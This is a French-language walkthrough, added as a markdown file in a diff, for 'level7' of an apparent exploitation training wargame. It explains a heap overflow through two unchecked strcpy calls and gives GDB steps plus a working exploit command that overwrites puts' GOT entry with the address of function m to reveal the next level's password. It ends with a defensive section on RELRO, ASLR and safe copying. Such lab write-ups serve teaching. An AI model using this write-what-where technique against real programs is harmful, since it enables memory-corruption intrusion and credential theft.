@@ -1,0 +1,228 @@
+# Exploitation de GOT via Heap Overflow - Level7
+
+## Analyse du Programme
+
+Le programme présente une vulnérabilité de heap overflow qui permet de réécrire la GOT. Voici le code source principal :
+
+```c
+undefined4 main(undefined4 param_1, int param_2) {
+    undefined4 *puVar1;
+    void *pvVar2;
+    undefined4 *puVar3;
+    FILE *__stream;
+    
+    puVar1 = (undefined4 *)malloc(8);
+    *puVar1 = 1;
+    pvVar2 = malloc(8);
+    puVar1[1] = pvVar2;
+    puVar3 = (undefined4 *)malloc(8);
+    *puVar3 = 2;
+    pvVar2 = malloc(8);
+    puVar3[1] = pvVar2;
+    strcpy((char *)puVar1[1], *(char **)(param_2 + 4));  // Premier strcpy vulnérable
+    strcpy((char *)puVar3[1], *(char **)(param_2 + 8));  // Deuxième strcpy vulnérable
+    __stream = fopen("/home/user/level8/.pass", "r");
+    fgets(c, 0x44, __stream);
+    puts("~~");
+    return 0;
+}
+
+void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) {
+    time_t tVar1;
+    tVar1 = time((time_t *)0x0);
+    printf("%s - %d\n", c, tVar1);
+    return;
+}
+```
+
+## Points Clés de Théorie
+
+1. **Vulnérabilité Heap Overflow**
+   - Deux `strcpy` sans vérification de taille
+   - Possibilité d'écraser la mémoire allouée adjacente
+   - Permet de modifier les pointeurs et rediriger les écritures
+
+2. **Structure de la Mémoire**
+   - Premier bloc : 8 bytes (structure puVar1)
+   - Deuxième bloc : 8 bytes (buffer1 pointé par puVar1[1])
+   - Troisième bloc : 8 bytes (structure puVar3)
+   - Quatrième bloc : 8 bytes (buffer2 pointé par puVar3[1])
+
+3. **Technique d'Exploitation "Write-What-Where"**
+   - **WHERE** : Contrôlé via l'overflow du premier strcpy (argv[1])
+   - **WHAT** : Contrôlé via le contenu du second strcpy (argv[2])
+   - **WHEN** : Déclenché lors du second strcpy qui écrit à l'adresse corrompue
+
+## Étapes de l'Exploitation
+
+### 1. Analyse du Programme
+
+```bash
+# Vérification des protections
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
+```
+
+### 2. Recherche des Adresses Cibles
+
+```bash
+# Trouver l'adresse GOT de puts
+objdump -R level7 | grep puts
+# Résultat attendu : 08049928 R_386_JUMP_SLOT puts@GLIBC_2.0
+
+# Alternative avec GDB
+(gdb) disas main
+# Trouver l'appel à puts, puis :
+(gdb) disas 0x8048400  # Adresse de puts@plt
+# Examiner le "jmp *0x????????" pour obtenir l'adresse GOT
+
+# Trouver l'adresse de la fonction m
+objdump -t level7 | grep " m"
+# Ou dans GDB :
+(gdb) info functions m
+```
+
+### 3. Détermination de l'Offset
+
+L'offset de 20 bytes permet d'atteindre `puVar3[1]` (le pointeur vers buffer2) depuis le début de buffer1, en tenant compte de l'alignement mémoire du heap.
+
+```bash
+# Tester l'offset
+./level7 $(python -c'print "A"*20') test  # Doit être OK
+./level7 $(python -c'print "A"*21') test  # Doit segfault
+./level7 $(python -c'print "A"*22') test  # Confirme l'overflow à 20+
+```
+
+Possible de vérifier depuis gdb:
+```bash
+gdb ./level7
+(gdb) disas main
+(gdb) b *0x... # Une addresse du programme avant strcpy
+(gdb) disas puts # On obtient l'addresse de puts dans la GOT.
+(gdb) b *0x... # Une addresse du programme après les strcpy
+
+# On run le programme avec nos prametre pour verifier l'ecriture sur l'addresse de l'appelle a puts vers notre addresse voulus
+(gdb) r $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python -c'print("AAAA")')
+# Premier beakpoint on check l'address appelé par put
+(gdb) x 0x... # address de puts
+(gdb) c
+(gdb) x 0x... # addresse de puts et valeur = 41414141 (AAAA) 
+
+```
+
+### 4. Construction de l'Exploit
+
+```bash
+./level7 $(python -c'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+```
+
+Décomposition de l'exploit :
+- **Premier argument** : "A"*20 + adresse de puts dans la GOT (0x08049928 en little-endian)
+- **Deuxième argument** : adresse de la fonction m (0x080484f4)
+
+## Explication Technique Détaillée
+
+### Structure de la Mémoire
+
+```
++------------------+  ← 0x804a008
+| Structure puVar1 |  8 bytes [1][ptr→buffer1]
++------------------+  ← 0x804a018  
+| Buffer1          |  8 bytes (cible du 1er strcpy)
++------------------+  ← 0x804a028
+| Structure puVar3 |  8 bytes [2][ptr→buffer2] ← CIBLE DE L'OVERFLOW
++------------------+  ← 0x804a038
+| Buffer2          |  8 bytes (cible du 2ème strcpy)
++------------------+
+```
+
+### Layout de l'Overflow
+
+```
+Buffer1 (8 bytes)     → [AAAAAAAA]
+Padding/Headers       → [AAAAAAAAAAAA]  (12 bytes)
+puVar3[1] (4 bytes)   → [\x28\x99\x04\x08] ← Adresse GOT de puts
+```
+
+### Processus d'Exploitation
+
+1. **Phase d'Allocation**
+   ```c
+   puVar1 = malloc(8);    // Structure 1
+   buffer1 = malloc(8);   // Buffer 1  
+   puVar3 = malloc(8);    // Structure 2
+   buffer2 = malloc(8);   // Buffer 2
+   ```
+
+2. **Phase d'Overflow (Premier strcpy)**
+   ```c
+   strcpy(buffer1, argv[1]);  // "A"*20 + adresse_GOT_puts
+   ```
+   - Écrit 20 'A' dans buffer1 (8 bytes) 
+   - Les 12 bytes supplémentaires débordent
+   - Écrase `puVar3[1]` avec l'adresse GOT de puts
+
+3. **Phase de Redirection (Deuxième strcpy)**
+   ```c
+   strcpy(puVar3[1], argv[2]);  // Mais puVar3[1] pointe maintenant vers la GOT !
+   ```
+   - Le programme croit écrire dans buffer2
+   - En réalité, écrit l'adresse de `m` dans la GOT de puts
+
+4. **Phase de Déclenchement**
+   ```c
+   puts("~~");  // Exécute m() au lieu de puts() !
+   ```
+   - `m()` affiche le contenu de `c` (le mot de passe)
+
+## Vérification de l'Exploit
+
+### Test de l'Overflow
+```bash
+# Vérifier que l'overflow fonctionne
+./level7 $(python -c'print "A"*20 + "BBBB"') $(python -c'print "CCCC"')
+# Doit causer un segfault car "BBBB" n'est pas une adresse valide
+```
+
+### Debug avec GDB
+```bash
+(gdb) set args $(python -c'print "A"*20 + "\x28\x99\x04\x08"') $(python -c'print "\xf4\x84\x04\x08"')
+(gdb) b *0x080485f7  # Juste avant puts
+(gdb) run
+(gdb) x/x 0x08049928  # Vérifier que la GOT contient l'adresse de m
+```
+
+## Sécurité
+
+Cette vulnérabilité illustre l'importance de :
+
+### Bonnes Pratiques
+- Utiliser des fonctions sécurisées (`strncpy` au lieu de `strcpy`)
+- Vérifier les tailles des buffers avant copie
+- Valider tous les inputs utilisateur
+
+### Protections Système
+- **RELRO** : Protège la GOT contre les modifications
+- **ASLR** : Randomise les adresses mémoire
+- **NX** : Empêche l'exécution de code sur la pile/heap
+- **Stack Canary** : Détecte les overflows de pile
+
+## Notes Techniques
+
+- Le programme nécessite exactement deux arguments
+- L'offset de 20 bytes est dû à l'alignement mémoire et aux métadonnées du heap
+- La fonction `m` affiche le contenu de la variable globale `c` qui contient le mot de passe
+- L'exploitation est possible car toutes les protections sont désactivées :
+  - **No RELRO** : La GOT est modifiable
+  - **NX disabled** : L'exécution de code est possible
+  - **No PIE** : Les adresses sont fixes et prévisibles
+  - **No ASLR** : Les adresses restent constantes entre les exécutions
+
+## Concept Clé : Write-What-Where
+
+Cette technique d'exploitation transforme deux `strcpy` innocents en un primitif puissant :
+- **Corruption de pointeur** : Le premier strcpy corrompt `puVar3[1]`
+- **Écriture contrôlée** : Le second strcpy écrit à l'adresse corrompue
+- **Résultat** : Capacité d'écrire n'importe quoi n'importe où en mémoire
+
+C'est exactement le principe du **write-what-where** : contrôler à la fois le contenu (WHAT) et la destination (WHERE) d'une écriture mémoire.
